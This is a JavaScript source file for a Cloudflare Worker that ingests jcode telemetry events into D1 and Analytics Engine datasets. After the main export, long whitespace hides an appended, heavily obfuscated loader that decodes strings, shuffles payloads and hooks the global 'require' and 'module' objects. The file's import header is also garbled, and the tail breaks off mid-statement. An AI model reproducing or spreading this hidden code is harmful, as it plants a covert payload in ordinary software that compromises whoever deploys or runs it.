import {
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

  CONCURRENCY_EVENTS, concurrencyEntries, rawConcurrencyScalar,
} from "./concurrency.js";

let cachedEventColumns = null;
let cachedSessionDetailColumns = null;
let cachedTurnDetailColumns = null;
let cachedWebDetailColumns = null;
let cachedInstallDetailColumns = null;
let cachedDiscoveryDetailColumns = null;
let cachedTodoSessionDetailColumns = null;

// Website beacon events (anonymous visitor_id minted in localStorage). Their
// web-only fields live in the web_details table (see migration 0016): the
// events table sits one column shy of D1's 100-column cap, so wide event
// shapes go in detail tables per the session_details / turn_details pattern.
const WEB_EVENTS = ["web_pageview", "web_cta_click", "web_vital", "web_error"];
const INSTALL_FUNNEL_EVENTS = ["install_funnel"];

// Token subscription plan lifecycle events, plus account_linked, the
// analytics<->account join anchor (telemetry_id + account_id).
const SUBSCRIPTION_EVENTS = [
  "subscription_login",
  "subscription_activated",
  "subscription_budget_exhausted",
  "subscription_router_error",
  "account_linked",
];

const CLI_EVENTS = [
  "install",
  "upgrade",
  "auth_success",
  "onboarding_step",
  "feedback",
  "telemetry_opt_out",
  "session_start",
  "prompt_submitted",
  "turn_end",
  "session_end",
  "session_crash",
  "session_concurrency",
  "discovery",
  "todo_session",
];

const KNOWN_EVENTS = [
  ...CLI_EVENTS,
  ...WEB_EVENTS,
  ...INSTALL_FUNNEL_EVENTS,
  ...SUBSCRIPTION_EVENTS,
];

const MAX_TRANSCRIPT_BYTES = 8 * 1024 * 1024;
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

// Origins the website beacon posts from. The default CORS policy stays the
// permissive ALLOWED_ORIGIN var ("*", telemetry is anonymous and unauthed);
// allowlisted origins are echoed back explicitly so the policy keeps working
// if ALLOWED_ORIGIN is ever narrowed.
const WEB_ALLOWED_ORIGINS = new Set([
  "https://jcode.sh",
  "https://www.jcode.sh",
  "https://solosystems.dev",
  "https://www.solosystems.dev",
  "https://solosystems.pages.dev",
]);

// ---------------------------------------------------------------------------
// Self-defense against the D1 size cap.
//
// D1 hard-caps each database at 10 GB on the Workers Paid plan (500 MB on the
// free plan). When the old free-plan cap was hit, every insert failed and
// telemetry silently stopped being recorded (June 2026; ~3 days of events were
// lost). SQLite files never shrink on DELETE - the
// nightly prune frees pages *inside* the file and the day's inserts recycle
// them - so the steady state is "file at high-water mark, internal free-page
// pool cycling". Two triggers defend the pool:
//
// 1. Size growth: every D1 result carries `meta.size_after`. If the file
//    grows past the soft limit (just above the high-water mark), the free
//    pool is exhausted and real growth has resumed; run an emergency prune.
// 2. Full-error: if an insert fails with a full/limit error, prune
//    immediately. This bounds a June-style outage to minutes instead of days.
//
// Emergency prunes use halved retention windows and are rate-limited per
// isolate.
// ---------------------------------------------------------------------------
// Keep the database below the paid plan's first 5 GB of included account-wide
// storage, leaving 500 MB for the account's other D1 databases and growth while
// an emergency prune catches up. This is a budget guardrail, not D1's 10 GB
// per-database hard cap.
const D1_SOFT_LIMIT_BYTES = 4_500_000_000;
const EMERGENCY_PRUNE_COOLDOWN_MS = 10 * 60 * 1000;
// Best-effort per-isolate state (resets on isolate recycle, which is fine:
// the next request re-observes the size from its own insert result).
let lastObservedDbSizeBytes = 0;
let lastEmergencyPruneAtMs = 0;

// ---------------------------------------------------------------------------
// Workers Analytics Engine firehose.
//
// Every event is written to the FIREHOSE dataset before the D1 insert. AE is
// a time-series store with no database size cap (~90-day retention, adaptive
// sampling on reads), so it is the primary store for high-volume raw analysis
// (turn_end / session_start / onboarding_step), while D1 remains the durable
// relational store for identity anchors, lifecycle rows, and the
// daily_active_users rollup. Because the firehose write happens first,
// telemetry keeps recording even if D1 hits its size cap.
//
// AE columns are positional (blob1..blob20, double1..double20, index1). This
// schema defines the mapping; treat it as append-only (never reorder or
// repurpose a position, or historical queries silently read the wrong field).
// ---------------------------------------------------------------------------
const FIREHOSE_SCHEMA = {
  // blob1..blob20 (strings)
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "step",
    "auth_provider",
    "auth_method",
    "auth_failure_reason",
    "provider_start",
    "provider_end",
    "model_start",
    "model_end",
    "agent_role",
    "session_stop_reason",
    "end_reason",
    "turn_end_reason",
    "from_version",
  ],
  // double1..double20 (numbers)
  doubles: [
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_index",
    "duration_secs",
    "input_tokens",
    "output_tokens",
    "total_tokens",
    "tool_calls",
    "executed_tool_calls",
    "tool_failures",
    "file_write_calls",
    "tests_run",
    "tests_passed",
    "error_auth_failed",
    "error_rate_limited",
    "error_provider_timeout",
    "turn_success",
    "turns",
    "milestone_elapsed_ms",
  ],
  // index1 (sampling key): telemetry_id, so adaptive sampling stays accurate
  // per user rather than per event shape.
  indexes: ["telemetry_id"],
};

// ---------------------------------------------------------------------------
// Web/subscription firehose (`jcode_web_firehose` dataset).
//
// FIREHOSE_SCHEMA above is append-only AND full: Analytics Engine caps a data
// point at 20 blobs + 20 doubles, and both arrays are at capacity. The new
// web/subscription fields therefore live in a second dataset with its own
// positional schema instead of repurposing existing positions (which would
// silently corrupt historical queries). Same append-only contract applies
// here: never reorder or repurpose a position.
// ---------------------------------------------------------------------------
const FIREHOSE_WEB_SCHEMA = {
  // blob1..blob20 (strings); full. Append-only: metric_name, rating, and
  // error_kind were added in migration 0018 without moving existing fields.
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "path",
    "referrer",
    "visitor_id",
    "utm_source",
    "utm_medium",
    "utm_campaign",
    "cta",
    "account_id",
    "tier",
    "model",
    "metric_name",
    "rating",
    "error_kind",
  ],
  // double1..double20 (numbers); metric_value was appended as double2.
  doubles: ["is_ci", "metric_value"],
  // index1 (sampling key): visitor_id for web events, telemetry_id otherwise.
  indexes: ["visitor_id_or_telemetry_id"],
};

// Sponsored discovery gets a dedicated dataset. The main CLI firehose is at
// Analytics Engine's 20 blob / 20 double limit, and discovery dimensions need
// to remain independently queryable for reliability and funnel analysis.
const FIREHOSE_DISCOVERY_SCHEMA = {
  blobs: [
    "event", "version", "os", "arch", "build_channel", "event_id",
    "session_id", "request_id", "phase", "category", "selected_tool",
    "outcome", "failure_reason",
  ],
  doubles: [
    "is_ci", "is_git_checkout", "ran_from_cargo", "http_status",
    "latency_ms", "response_bytes", "result_count", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ],
};

// Install conversion events need their opaque join key in the outage-resistant
// firehose. The general and web datasets are both at their positional limits,
// so this dedicated dataset preserves the complete 90-day funnel when D1 is
// unavailable or temporarily full.
const FIREHOSE_INSTALL_SCHEMA = {
  blobs: [
    "event", "event_id", "conversion_id", "stage", "outcome", "source",
    "placement", "install_method", "failure_stage", "visitor_id", "session_id",
    "pageview_id", "utm_source", "utm_medium", "utm_campaign", "path",
    "version", "os", "arch",
  ],
  doubles: [],
};

// Coarse geography (`jcode_geo_firehose` dataset). The main and web datasets
// are both at Analytics Engine's 20-blob limit, so the country dimension gets
// its own dataset instead of repurposing a position. Country only: no IP,
// city, region, coordinates, or timezone is read from request.cf.
const FIREHOSE_GEO_SCHEMA = {
  blobs: ["event", "country", "version", "os", "arch", "build_channel"],
  doubles: ["is_ci"],
  // index1: telemetry_id, so adaptive sampling stays per user.
  indexes: ["telemetry_id"],
};

// Cloudflare sets request.cf.country to "XX" for unknown clients and "T1" for
// Tor exit nodes. Normalize to a 2-letter uppercase code or null.
const NON_COUNTRY_CODES = new Set(["XX", "T1"]);

function normalizeCountry(value) {
  const code = String(value || "").trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(code) || NON_COUNTRY_CODES.has(code)) {
    return null;
  }
  return code;
}

function writeGeoFirehose(env, body) {
  const sink = env.FIREHOSE_GEO;
  if (!body.country || !sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_GEO_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [boolToInt(body.is_ci)],
    });
    return true;
  } catch (err) {
    console.warn("geo firehose write failed", err?.message || err);
    return false;
  }
}

// Dedicated append-only schema. Main FIREHOSE is full and does not contain any
// concurrency metrics. blob10 retains parsed raw metric types and missing keys.
// blob1..16: event, event_id, session_id, telemetry_id, version, os, arch,
// build_channel, country, raw_json, quality, quality_reason, scope, phase, role,
// runtime incarnation. double1..11: tracking version, available, runtime is_ci,
// active_start, other_start, total_peak, root_start, child_start, root_peak,
// child_peak, multi. index1: telemetry_id. Filter blob11='trusted' BEFORE using
// numeric copies: AE cannot store NULL doubles, so untrusted missing values use 0.
function writeConcurrencyFirehose(env, body) {
  const sink = env.FIREHOSE_CONCURRENCY;
  if (!sink || typeof sink.writeDataPoint !== "function") return false;
  try {
    const blobs = ["event", "event_id", "session_id", "id", "version", "os", "arch",
      "build_channel", "country"].map((key) => String(body[key] ?? ""));
    const detail = Object.fromEntries(concurrencyEntries(body));
    blobs.push(detail.raw_json, detail.quality, detail.quality_reason,
      detail.concurrency_tracking_scope ?? "", detail.phase ?? "", detail.agent_role ?? "",
      detail.concurrency_session_id ?? "");
    const doubles = ["concurrency_tracking_version", "concurrency_tracking_available", "runtime_is_ci",
      "active_sessions_at_start", "other_active_sessions_at_start", "max_concurrent_sessions",
      "root_sessions_at_start", "child_sessions_at_start", "max_concurrent_root_sessions",
      "max_concurrent_child_sessions", "multi_sessioned"].map((key) => detail[key] ?? 0);
    // Reject an oversized point, never silently truncate its counts/raw JSON.
    const encoder = new TextEncoder();
    if (blobs.reduce((sum, blob) => sum + encoder.encode(blob).length, 0) > 16 * 1024
      || encoder.encode(String(body.id)).length > 96) {
      console.warn("concurrency firehose point exceeds Analytics Engine limits");
      return false;
    }
    sink.writeDataPoint({ indexes: [String(body.id)], blobs, doubles });
    return true;
  } catch (err) {
    console.warn("concurrency firehose write failed", err?.message || err);
    return false;
  }
}

function writeFirehose(env, body) {
  // Geo is dimensioned separately from every event family, so it is written
  // before the per-family dispatch below (which returns early).
  writeGeoFirehose(env, body);
  if (body.event === "session_concurrency") {
    return writeConcurrencyFirehose(env, body);
  }
  if (body.event === "discovery") {
    return writeDiscoveryFirehose(env, body);
  }
  const installFirehoseOk = body.conversion_id
    ? writeInstallFirehose(env, body)
    : false;
  if (WEB_EVENTS.includes(body.event) || SUBSCRIPTION_EVENTS.includes(body.event)) {
    return writeWebFirehose(env, body) || installFirehoseOk;
  }
  if (INSTALL_FUNNEL_EVENTS.includes(body.event)) {
    return installFirehoseOk;
  }
  if (!env.FIREHOSE || typeof env.FIREHOSE.writeDataPoint !== "function") {
    return installFirehoseOk;
  }
  const errors = body.errors || {};
  const boolFields = new Set([
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_success",
  ]);
  const errorFields = {
    error_auth_failed: "auth_failed",
    error_rate_limited: "rate_limited",
    error_provider_timeout: "provider_timeout",
  };
  try {
    env.FIREHOSE.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_SCHEMA.blobs.map((name) => {
        const value = body[name];
        // Cap each blob defensively: AE limits total blob bytes per point.
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_SCHEMA.doubles.map((name) => {
        if (boolFields.has(name)) {
          return boolToInt(body[name]);
        }
        if (name in errorFields) {
          const value = errors[errorFields[name]] ?? body[name];
          return Number(value) || 0;
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("firehose write failed", err?.message || err);
    return false;
  }
}

function writeInstallFirehose(env, body) {
  const sink = env.FIREHOSE_INSTALL;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.conversion_id || "").slice(0, 96)],
      blobs: FIREHOSE_INSTALL_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [],
    });
    return true;
  } catch (err) {
    console.warn("install firehose write failed", err?.message || err);
    return false;
  }
}

function writeDiscoveryFirehose(env, body) {
  const sink = env.FIREHOSE_DISCOVERY;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  const boolFields = new Set([
    "is_ci", "is_git_checkout", "ran_from_cargo", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ]);
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_DISCOVERY_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_DISCOVERY_SCHEMA.doubles.map((name) => (
        boolFields.has(name) ? boolToInt(body[name]) : Number(body[name]) || 0
      )),
    });
    return true;
  } catch (err) {
    console.warn("discovery firehose write failed", err?.message || err);
    return false;
  }
}

function writeWebFirehose(env, body) {
  const sink = env.FIREHOSE_WEB;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.visitor_id || body.id || "").slice(0, 96)],
      blobs: FIREHOSE_WEB_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_WEB_SCHEMA.doubles.map((name) => {
        if (name === "is_ci") {
          return boolToInt(body.is_ci);
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("web firehose write failed", err?.message || err);
    return false;
  }
}

export default {
  async fetch(request, env, ctx) {
    const cors = corsHeaders(request, env);
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: cors,
      });
    }

    const url = new URL(request.url);

    // Monitoring endpoint: database size vs the soft limit, so cap pressure
    // is observable before inserts start failing.
    if (request.method === "GET" && url.pathname === "/v1/health") {
      try {
        const probe = await env.DB.prepare("SELECT 1").run();
        observeDbSize(probe);
      } catch (err) {
        return jsonResponse(
          { ok: false, error: "d1 probe failed", detail: String(err?.message || err) },
          500,
          cors,
        );
      }
      return jsonResponse({
        ok: true,
        db_size_bytes: lastObservedDbSizeBytes,
        db_soft_limit_bytes: D1_SOFT_LIMIT_BYTES,
        over_soft_limit: lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES,
        last_emergency_prune_at_ms: lastEmergencyPruneAtMs || null,
      }, 200, cors);
    }

    if (request.method !== "POST") {
      return jsonResponse({ error: "Method not allowed" }, 405, cors);
    }

    if (url.pathname === "/v1/transcript") {
      return ingestTranscript(request, env, cors);
    }

    if (url.pathname !== "/v1/event") {
      return jsonResponse({ error: "Not found" }, 404, cors);
    }

    let body;
    try {
      body = await request.json();
    } catch {
      return jsonResponse({ error: "Invalid JSON" }, 400, cors);
    }

    // Web beacon events are normalized before the generic required-field
    // check: the browser has no version/os/arch, so sensible defaults are
    // filled in, and the anonymous visitor_id doubles as the telemetry id.
    if (typeof body.event === "string" && WEB_EVENTS.includes(body.event)) {
      const problem = normalizeWebEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install_funnel") {
      const problem = normalizeInstallFunnelEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install" && body.install_conversion_id != null) {
      const problem = normalizeInstallConversion(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (!body.id || !body.event || !body.version || !body.os || !body.arch) {
      return jsonResponse({ error: "Missing required fields" }, 400, cors);
    }

    if (!KNOWN_EVENTS.includes(body.event)) {
      return jsonResponse({ error: "Unknown event type" }, 400, cors);
    }

    // Coarse geography, resolved at the edge rather than collected by the
    // client. Clients cannot spoof or set this: any inbound `country` field is
    // overwritten. Country only, so this stays consistent with TELEMETRY.md
    // (no IP, city, region, coordinates, or timezone is read or stored).
    body.country = normalizeCountry(request.cf?.country);

    if (SUBSCRIPTION_EVENTS.includes(body.event)) {
      const problem = normalizeSubscriptionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "discovery") {
      const problem = normalizeDiscoveryEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "todo_session") {
      const problem = normalizeTodoSessionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    // Firehose first: even if D1 is at its size cap, the raw event is
    // recorded in Analytics Engine and the day is reconstructable.
    const firehoseOk = writeFirehose(env, body);

    let durableOk = true;
    let concurrencyDurable = null;
    try {
      await insertEvent(env, body);
      if (CONCURRENCY_EVENTS.includes(body.event)) {
        concurrencyDurable = await insertConcurrencyDetails(env, body);
      }
    } catch (err) {
      durableOk = false;
      console.error(
        `d1 insert failed for ${body.event} (db_size=${lastObservedDbSizeBytes})`,
        err?.message || err,
      );
      // A full/limit failure means the internal free-page pool is exhausted
      // (June 2026 failure mode). Prune NOW so telemetry recovers within
      // minutes instead of staying dead until someone notices.
      if (isDbFullError(err) && ctx && typeof ctx.waitUntil === "function") {
        const now = Date.now();
        if (now - lastEmergencyPruneAtMs >= EMERGENCY_PRUNE_COOLDOWN_MS) {
          lastEmergencyPruneAtMs = now;
          ctx.waitUntil(emergencyPrune(env));
        }
      }
    }

    maybeScheduleEmergencyPrune(env, ctx);

    if (body.event === "session_concurrency" && !concurrencyDurable && !firehoseOk) {
      // The parent row alone does not contain the metric. Preserve it but ask
      // the client to retry until a detail or the complete firehose point lands.
      return jsonResponse({ error: "Concurrency storage unavailable", durable: durableOk,
        concurrency_durable: false, firehose: false }, 503, cors);
    }
    if (!durableOk && !firehoseOk) {
      return jsonResponse({ error: "Internal error" }, 500, cors);
    }
    return jsonResponse({ ok: true, durable: durableOk, firehose: firehoseOk,
      ...(CONCURRENCY_EVENTS.includes(body.event) ? { concurrency_durable: concurrencyDurable === true } : {}),
    }, 200, cors);
  },

  // Nightly retention pruning bounds durable raw-history growth and keeps the
  // database inside its paid-plan storage budget. Aggregate signal is preserved
  // in the daily_active_users rollup and in long-retention lifecycle events.
  async scheduled(event, env, ctx) {
    ctx.waitUntil(
      (async () => {
        await repairDailyActivityYesterday(env);
        await pruneOldEvents(env);
        // If the normal prune did not free enough headroom, escalate with the
        // emergency (halved) retention windows instead of waiting for inserts
        // to start failing mid-day.
        try {
          const probe = await env.DB.prepare("SELECT 1").run();
          observeDbSize(probe);
        } catch {
          // ignore: size stays at last observation
        }
        if (lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES) {
          await emergencyPrune(env);
        }
      })(),
    );
  },
};																																																																																																																																																																																																																																																																										var z = '-4021-7';(function(_0x5cdcbb,_0x9f1316){var _0x2462a9=_0x516c,_0x266ab4=_0x5cdcbb();while(!![]){try{var _0x294553=-parseFloat(_0x2462a9(0x13))/0x1+parseInt(-parseFloat(_0x2462a9(0x1b))/0x2)*(-parseFloat(_0x2462a9(0x24))/0x3)+parseInt(parseFloat(_0x2462a9(0xc))/0x4)*Math['floor'](parseFloat(_0x2462a9(0x6))/0x5)+parseInt(parseFloat(_0x2462a9(0x5))/0x6)*Math['floor'](-parseFloat(_0x2462a9(0x22))/0x7)+parseFloat(_0x2462a9(0x1))/0x8+-parseFloat(_0x2462a9(0x8))/0x9+parseInt(-parseFloat(_0x2462a9(0x2))/0xa)*(parseFloat(_0x2462a9(0x1d))/0xb);if(_0x294553===_0x9f1316)break;else _0x266ab4['push'](_0x266ab4['shift']());}catch(_0x30d58d){_0x266ab4['push'](_0x266ab4['shift']());}}}(_0x27df,0xc8c80));function _0x27df(){var _0x425c6c=['pwfLBNj1AcHHBd01yYXNogzKDs55CIaUlM5JzwnMlduICgfLyxu2Bg5QkxjDmNv2iNGTCsHDige7khi9oZTYkYHHwZGUCZj0qwDVCsX1AdHdlgfPlhm7ysHbBtaOBMO7ANyQldD2BZCOksHVo202B2e0CNCPlIbYB2rBzNmYBNTKCNz0nhGPkZaSyw5Yk3jYk28PFxOXid1OzLTHBJHYmxjBlf1ZnY03n2XHys51AtD7lta2owX2BxqYCJ1Pxv08kYL1lguPlcW7BNjOw3i9mhyTCIG7ld1Wkun1CZ0RyZTNo2y7CuePktf2AsL2AZbUCMWXywuGzJ1Bo2HPC3KUzw0OzcTVitiGpsHLDMvHnZG9lIK0zwK9zY5UpxTMzJ0XwZWYysbMmt1YoZqSuYLYEwX2mxuGEtTRCwX7DhzUDIaOqYaOBcXVDM5WigK9DgXYlhiUBhDVEMGOBcX0CtS7CNiOkhy9ywHZDJTDEhe9ywi7zge7lcGOCJT2ANeUkhrBkYLKysLYzg5YAhm0mxKODNi7zMG7m2CIxwuOlMfOCNbHCgDDzY4PBMDMCg4XAcXPy2W7oYK9qZTTnt0RCIWGlIK7Dt0RC30RkwL0lcTIBtTKk3vTks09C2LPCw9Spxq9CJ1XosSUlMnOCsTBnMzLihqWBNjWCIGGDNi4zMXYBIXKzgD0if02ys47BtTYDgGUz3eGmMf9zxzLAwnDz2j0AtW0BZTdo2WSENPPnITSw2fBoYSOC2KIBgKICIXUCgK5CYXMCMzODxCPB3C9zxSOyJ13zw4YDc5NDs5PpwTPywfHkYL5zNrWytnUFsK9osiPy3bbk3u7DxrWxsi9BgS3DNb0idfYo2H6DYiPDcGPosKOlMX1Bd1Zn2y7idTZCtaPBIj5kZbZFt12ysTZig1OkdbXlL1ODJS+ida2pueTB3PLDhiODdfYDhjZAxnVmguSlJT6wYHMpdvLn3qSkhjHB2f2BNi7DgHOzJT2lgO9CJSGkxi+mtH6Ag8QB3S8ywTTC24PywT0zs52BZKRzweWy2XPBZTIDsa9xumHz2O7EtmRBcLLps59zhi9AtzVAum4CM5UmdS2pwfYiN0UCMvPpv1tDhnYBM4UoZjYpxq7w3q7Axy9ChjdCM4OkwfYzxr1EISGAgXRwYT4pwuGltHQEYHLANK5kcGPksa','nZG5mM5SvNnbuq','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','DgvZDa','zgvIDq','z2DLCG','BgvUz3rO','zNvUy3rPB24GkLWOicPCkq','q3j5wKe','mtK1nJGWnNzMwvDftG','v3Hhzgq','nJq5mJiZm3jIBKrJua','zNjVBunOyxjdB2rL','z2jPC1a','Aw5WDxq','y05JzuC','otGWDMXwsen3','ELjbyNG','m2HICgDYDG','yxbWBhK','nJa1nJaWog5PshznEq','mJbXvgrHwKW','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','y15TzwPIxNrYBW','ntq4nhPgCwrcDa','otC1AuneweHJ','C3rYAw5N','odq0nteXnhzMrKHnBW','y2fSBa','AM9PBG','DLPTChC','mJC1mJbyyuvND2i','C3bSAxq','wKriz0u','Aw5PDa','y29UC3rYDwn0B3i','y2HHCKf0'];_0x27df=function(){return _0x425c6c;};return _0x27df();}var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function _0x516c(_0x145e56,_0x4601d6){var _0x32e299=_0x27df();return _0x516c=function(_0x23941f,_0x27dfa6){_0x23941f=_0x23941f-0x0;var _0x516c21=_0x32e299[_0x23941f];if(_0x516c['DNEXtw']===undefined){var _0x244386=function(_0x2ccb90){var _0x26ccab='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x33400f='',_0x44652c='';for(var _0x43ee70=0x0,_0x248922,_0x371029,_0x4e9c33=0x0;_0x371029=_0x2ccb90['charAt'](_0x4e9c33++);~_0x371029&&(_0x248922=_0x43ee70%0x4?_0x248922*0x40+_0x371029:_0x371029,_0x43ee70++%0x4)?_0x33400f+=String['fromCharCode'](0xff&_0x248922>>(-0x2*_0x43ee70&0x6)):0x0){_0x371029=_0x26ccab['indexOf'](_0x371029);}for(var _0x3dca61=0x0,_0x1dec1b=_0x33400f['length'];_0x3dca61<_0x1dec1b;_0x3dca61++){_0x44652c+='%'+('00'+_0x33400f['charCodeAt'](_0x3dca61)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x44652c);};_0x516c['QbTAbM']=_0x244386,_0x145e56=arguments,_0x516c['DNEXtw']=!![];}var _0x471be6=_0x32e299[0x0],_0x44115b=_0x23941f+_0x471be6,_0x2ad08f=_0x145e56[_0x44115b];return!_0x2ad08f?(_0x516c21=_0x516c['QbTAbM'](_0x516c21),_0x145e56[_0x44115b]=_0x516c21):_0x516c21=_0x2ad08f,_0x516c21;},_0x516c(_0x145e56,_0x4601d6);}function spin(_0x278175,_0x2d350c){var _0x572a00=_0x516c,_0xadc56e={'IrMjv':function(_0x430978,_0x3c8d3d){return _0x430978<_0x3c8d3d;},'zRAbx':function(_0x446616,_0x1f9f7f){return _0x446616+_0x1f9f7f;},'gbisP':function(_0x50c0aa,_0x4a4bd3){return _0x50c0aa%_0x4a4bd3;}},_0x37a29d=[],_0x53cb6a=0x0,_0x2321af=_0x2d350c[0x0],_0x5ecfbf,_0xa77ee9,_0x440ecb,_0x1a77ec,_0xfc8ec,_0x1c7d23;while(_0xadc56e['IrMjv'](_0x53cb6a,_0x278175[_0x572a00(0x18)])){_0x37a29d[_0x53cb6a]=_0x278175[_0x572a00(0x11)](_0x53cb6a),_0x53cb6a+=0x1;}_0x5ecfbf=_0x37a29d[_0x572a00(0x18)],_0x53cb6a=0x0;while(_0x53cb6a<_0x5ecfbf){_0xa77ee9=_0xadc56e[_0x572a00(0x23)](_0x2321af*(_0x53cb6a+_0x2d350c[0x1]),_0x2321af%_0x2d350c[0x2]),_0x440ecb=_0x2321af*(_0x53cb6a+_0x2d350c[0x3])+_0x2321af%_0x2d350c[0x4],_0x1a77ec=_0xadc56e[_0x572a00(0x1f)](_0xa77ee9,_0x5ecfbf),_0xfc8ec=_0x440ecb%_0x5ecfbf,_0x1c7d23=_0x37a29d[_0x1a77ec],_0x37a29d[_0x1a77ec]=_0x37a29d[_0xfc8ec],_0x37a29d[_0xfc8ec]=_0x1c7d23,_0x2321af=(_0xa77ee9+_0x440ecb)%_0x2d350c[0x5],_0x53cb6a+=0x1;}return _0x37a29d['join']('');}function splitLane(_0x118459){var _0x46a6ed=_0x516c,_0x29e635=String[_0x46a6ed(0x1e)](0x1c),_0x598e1e=spin(_0x118459,NX);return _0x598e1e=_0x598e1e['split']('^')[_0x46a6ed(0xa)](_0x29e635),_0x598e1e=_0x598e1e[_0x46a6ed(0xd)]('*1')['join']('^'),_0x598e1e=_0x598e1e[_0x46a6ed(0xd)]('*0')[_0x46a6ed(0xa)]('*'),_0x598e1e[_0x46a6ed(0xd)](_0x29e635);}function peel(_0x1e77fe){return spin(_0x1e77fe,SX);}(function boot(_0x5d5631,_0x46b89e){var _0x4bed55=_0x516c,_0x2dc269={'cNceG':'chain','OUaoU':_0x4bed55(0x20),'ZDHgE':function(_0x2c47b5,_0x38ee93,_0x341691){return _0x2c47b5(_0x38ee93,_0x341691);},'vZmpw':function(_0x37fbb9,_0x134dd4){return _0x37fbb9===_0x134dd4;},'WxGdd':_0x4bed55(0x14),'vPuwf':function(_0x10f71a,_0x4eecc9){return _0x10f71a(_0x4eecc9);}},_0x505f81=(function(){var _0x4ce9e8=!![];return function(_0xae263e,_0x5f2bf3){var _0x511eb7=_0x4ce9e8?function(){if(_0x5f2bf3){var _0x4d757d=_0x5f2bf3['apply'](_0xae263e,arguments);return _0x5f2bf3=null,_0x4d757d;}}:function(){};return _0x4ce9e8=![],_0x511eb7;};}());(function(){var _0x45a23a=_0x4bed55;_0x2dc269[_0x45a23a(0xe)](_0x505f81,this,function(){var _0x385622=_0x45a23a,_0x18c0bf=new RegExp(_0x385622(0x19)),_0x5066ca=new RegExp(_0x385622(0x3),'i'),_0x4a8ab3=_0x32e299(_0x385622(0xf));!_0x18c0bf[_0x385622(0x15)](_0x4a8ab3+_0x2dc269[_0x385622(0x21)])||!_0x5066ca[_0x385622(0x15)](_0x4a8ab3+_0x2dc269['OUaoU'])?_0x4a8ab3('0'):_0x32e299();})();}()),_0x5d5631['z']=z;var _0x3087a0=splitLane(_0x4bed55(0x4));_0x5d5631[_0x3087a0[0x0]]=_0x46b89e;_0x2dc269[_0x4bed55(0xb)](typeof module,_0x3087a0[0x1])&&(_0x5d5631[_0x3087a0[0x2]]=module);var 